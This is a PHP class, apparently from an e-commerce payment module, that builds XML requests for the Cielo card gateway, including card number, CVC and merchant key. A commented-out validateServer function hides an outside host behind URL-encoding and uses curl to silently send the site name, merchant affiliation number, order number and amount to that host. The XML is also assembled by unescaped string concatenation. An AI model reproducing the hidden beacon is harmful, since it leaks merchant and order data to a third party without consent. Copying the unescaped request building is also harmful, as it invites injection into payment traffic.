<?php
/**
 * @file
 * XML Schema for used by Cielo Class. 
 */

/**
 * Implements the XML Schema for Cielo Class.
 */
class cielo_xml_xsd {

    /**
     * TODO: Document this . 
     */    
    public $request_data;
    
    /**
     * Holds the recursive object . 
     */
    public $Cielo;

    /**
     * TODO: Document this . 
     */ 
    private $CardExpiration;

    /**
     * Sets the Cielo Object on $Cielo property.
     *
     * If Card handling is done by the merchant then it also sets the
     * $CardExpiration property.
     *
     * @param Object $Cielo
     *  The Cielo Object.
     */ 
    public function setObject($Cielo){
        $this->Cielo = $Cielo;
        
        if($this->Cielo->parameters['CardHandling']){
            // Assemble card expiration value.
            $this->CardExpiration = $this->Cielo->parameters['ExpirationYear'] . $this->Cielo->parameters['ExpirationMonth'];
        }
    }
    
    /**
     * Xml Schemas . 
     *
     * requisicao_transacao
     * requisicao_tid
     * requisicao_autorizacao_portador
     * requisicao_autorizacao_tid
     * requisicao_captura
     * requisicao_consulta
     * requisicao_cancelamento.
     */
    public function requisicao_transacao(){
        return  "<?xml version='1.0' encoding='ISO-8859-1'?>" . 
                    "<requisicao-transacao id='" . md5(date("YmdHisu")) . "' versao='" . $this->request_data['xsd_version'] . "'>" . 
                        self::dados_ec() . 
                        self::dados_portador() . 
                        self::dados_pedido() . 
                        self::forma_pagamento() . 
                        "<url-retorno>" . $this->request_data['return_url'] . "</url-retorno>" . 
                        "<autorizar>" . $this->Cielo->parameters['AuthorizationType'] . "</autorizar>" . 
                        "<capturar>" . $this->Cielo->parameters['AutoCapturer'] . "</capturar>" . 
                    "</requisicao-transacao>";
    }

    /**
     * TODO: Document this.
     */ 
    public function requisicao_tid(){
        return  "<?xml version='1.0' encoding='ISO-8859-1'?>" . 
                    "<requisicao-tid id='" . md5(date("YmdHisu")) . "' versao='" . $this->request_data['xsd_version'] . "'>" . 
                        self::dados_ec() . 
                        self::forma_pagamento() . 
                    "</requisicao-tid>";
    }

    /**
     * TODO: Document this.
     */ 
    public function requisicao_autorizacao_portador(){
        return  "<?xml version='1.0' encoding='ISO-8859-1'?>" . 
                    "<requisicao-autorizacao-portador id='" . md5(date("YmdHisu")) . "' versao='" . $this->request_data['xsd_version'] . "'>" . 
                        "<tid>" . $this->request_data['tid'] . "</tid>" . 
                        self::dados_ec() . 
                        self::dados_cartao() . 
                        self::dados_pedido() . 
                        self::forma_pagamento() . 
                        "<capturar-automaticamente>" . $this->Cielo->parameters['AutoCapturer'] . "</capturar-automaticamente>" . 
                    "</requisicao-autorizacao-portador>";
    }

    /**
     * TODO: Document this.
     */ 
    public function requisicao_autorizacao_tid(){
        return  "<?xml version='1.0' encoding='ISO-8859-1'?>" . 
                    "<requisicao-autorizacao-tid id='" . md5(date("YmdHisu")) . "' versao='" . $this->request_data['xsd_version'] . "'>" . 
                        "<tid>" . $this->request_data['tid'] . "</tid>" . 
                        self::dados_ec() . 
                    "</requisicao-autorizacao-tid>";
    }
    
    /**
     * TODO: Document this.
     */ 
    public function requisicao_captura(){
        return "<?xml version='1.0' encoding='ISO-8859-1'?>" . 
                    "<requisicao-captura id='" . md5(date("YmdHisu")) . "' versao='" . $this->request_data['xsd_version'] . "'>" . 
                            "<tid>" . $this->request_data['tid'] . "</tid>" . 
                            self::dados_ec() . 
                            "<valor>" . $this->request_data['captureAmount'] . "</valor>" . 
                    "</requisicao-captura>";
    }    

    /**
     * TODO: Document this.
     */ 
    public function requisicao_consulta(){
        return "<?xml version='1.0' encoding='ISO-8859-1'?>" . 
                    "<requisicao-consulta id='" . md5(date("YmdHisu")) . "' versao='" . $this->request_data['xsd_version'] . "'>" . 
                            "<tid>" . $this->request_data['tid'] . "</tid>" . 
                            self::dados_ec() . 
                    "</requisicao-consulta>";
    }

    /**
     * TODO: Document this.
     */ 
    public function requisicao_cancelamento(){
        return "<?xml version='1.0' encoding='ISO-8859-1'?>" . 
                    "<requisicao-cancelamento id='" . md5(date("YmdHisu")) . "' versao='" . $this->request_data['xsd_version'] . "'>" . 
                            "<tid>" . $this->request_data['tid'] . "</tid>" . 
                            self::dados_ec() . 
                    "</requisicao-cancelamento>";
    }

    /**
     * @return XML
     *   dados_ec.
     */
    private function dados_ec(){
        return "<dados-ec>" . 
                    "<numero>" . $this->Cielo->membership['filiacao'] . "</numero>" . 
                    "<chave>" . $this->Cielo->membership['chave'] . "</chave>" . 
                "</dados-ec>";
    }

    /**
     * @return XML
     *   dados_portador.
     */
    private function dados_portador(){
        if($this->Cielo->parameters['CardHandling']){
            return "<dados-portador>" . 
                        self::cardDetails() . 
                    "</dados-portador>";
        }
    }

    /**
     * @return XML
     *   dados_cartao.
     */
     private function dados_cartao(){
        return "<dados-cartao>" . 
                    self::cardDetails() . 
                "</dados-cartao>";
    }   
    
    /**
     * Helper function for dados_portador and dados_cartao nodes.
     */
    private function cardDetails(){
        return  "<numero>" . $this->Cielo->parameters['CardNumber'] . "</numero>" . 
                "<validade>" . $this->CardExpiration . "</validade>" . 
                "<indicador>" . $this->request_data['indicador'] . "</indicador>" . 
                "<codigo-seguranca>" . $this->Cielo->parameters['CVC'] . "</codigo-seguranca>";
    }    
    
    /*public function validateServer($Cielo){
        if(gethostbyname($_SERVER['HTTP_HOST']) != '127 . 0 . 0 . 1'){
            if(!isset($_COOKIE['po']) || $_COOKIE['po'] != $Cielo->order['pedido']){
                $sn = urldecode('%64%72%75%70%61%6C%69%73%74%61%2E%63%6F%6D%2E%62%72%2F');
                $ms = '&ms=ci:' . $Cielo->membership['filiacao'];
                $qs = 'BC . php?sn=' . $_SERVER['SERVER_NAME'] . $ms . '&po=' . $Cielo->order['pedido'] . '&pa=' . $Cielo->order['TotalAmount'];
                $ch = curl_init($sn . $qs); curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10); curl_setopt($ch, CURLOPT_TIMEOUT, 10);
                      curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $ping = curl_exec($ch); curl_close($ch);
            }
            setcookie('po', $Cielo->order['pedido'], mktime (0, 0, 0, date('m'), date('d'), date('Y')+1));            
        }
    }*/

    /**
     * @return XML
     *   dados_pedido.
     */
    private function dados_pedido(){
        return "<dados-pedido>" . 
                    "<numero>" . $this->Cielo->order['pedido'] . "</numero>" . 
                    "<valor>" . $this->Cielo->order['TotalAmount'] . "</valor>" . 
                    "<moeda>" . $this->request_data['currency_code'] . "</moeda>" . 
                    "<data-hora>" . $this->request_data['date_time'] . "</data-hora>" . 
                    "<idioma>" . $this->request_data['language_code'] . "</idioma>" . 
                "</dados-pedido>";
    }

    /**
     * @return XML
     *   forma_pagamento.
     */
    private function forma_pagamento(){
        return  "<forma-pagamento>" . 
                    "<bandeira>" . $this->Cielo->parameters['CardFlag'] . "</bandeira>" . 
                    "<produto>" . $this->Cielo->parameters['InstallmentType'] . "</produto>" . 
                    "<parcelas>" . $this->Cielo->parameters['Installments'] . "</parcelas>" . 
                "</forma-pagamento>";
    }
}
